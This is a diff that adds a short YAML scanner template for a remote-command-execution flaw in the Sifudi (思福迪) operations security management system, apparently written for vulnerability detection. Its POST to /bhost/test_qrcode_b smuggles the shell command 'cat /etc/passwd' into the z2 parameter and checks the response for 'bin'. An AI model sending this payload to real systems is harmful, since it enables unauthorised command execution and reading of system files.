@@ -1,0 +1,19 @@
+id:
+info:
+  name: 思福迪运维安全管理系统 test_qrcode_b RCE漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /bhost/test_qrcode_b
+  headers:
+  data: |
+    z1=1&z2="|cat /etc/passwd;"&z3=bhost
+response1:
+  headers:
+  body: bin
+  code:
+requests2:
+response2:
